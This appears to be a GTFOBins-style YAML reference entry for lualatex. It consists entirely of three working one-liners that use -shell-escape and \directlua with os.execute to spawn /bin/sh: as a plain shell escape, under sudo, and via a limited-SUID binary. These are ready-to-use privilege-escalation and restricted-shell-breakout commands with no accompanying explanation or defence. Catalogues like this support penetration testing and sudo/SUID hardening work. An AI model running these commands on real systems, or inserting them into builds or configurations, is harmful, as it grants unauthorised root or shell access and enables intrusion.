---
description: This allows to execute [`lua`](../lua/index.html) code.
functions:
  shell:
    - code: lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
  sudo:
    - code: sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
  limited-suid:
    - code: ./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
---
